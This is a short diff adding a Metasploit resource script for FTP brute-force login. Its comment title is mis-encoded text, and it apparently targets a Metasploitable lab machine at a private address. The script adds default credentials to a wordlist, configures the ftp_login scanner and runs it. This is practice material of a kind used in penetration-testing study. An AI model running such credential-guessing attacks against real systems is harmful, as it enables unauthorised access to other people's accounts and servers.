@@ -1,0 +1,6 @@
+# FTPµÄ±©Á¦ÆÆ½â
+# echo "msfadmin msfadmin" >> /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+use auxiliary/scanner/ftp/ftp_login
+set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+set RHOSTS 192.168.1.105
+run
